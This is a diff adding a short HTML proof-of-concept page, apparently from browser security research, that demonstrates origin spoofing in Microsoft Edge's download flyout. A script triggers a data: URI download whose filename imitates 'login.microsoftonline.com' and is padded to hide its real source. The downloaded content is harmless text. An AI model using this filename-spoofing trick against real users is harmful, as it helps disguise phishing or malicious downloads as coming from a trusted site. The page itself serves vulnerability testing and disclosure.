@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="utf-8"><title>Edge Download Flyout Spoof</title></head>
+<body>
+<h3>Edge #5: Download flyout origin spoof (data: URI)</h3>
+<p>Klik tombol. Trigger download via data: URI. Perhatikan dialog download Edge.</p>
+<button onclick="go()">Mulai</button>
+<script>
+function go(){
+  var a = document.createElement("a");
+  a.href = "data:text/plain,PoC-Edge-download-origin-spoofing-content";
+  a.download = "https---login.microsoftonline.com-" + "x".repeat(100) + ".txt";
+  document.body.appendChild(a);
+  a.click();
+}
+</script>
+</body>
+</html>
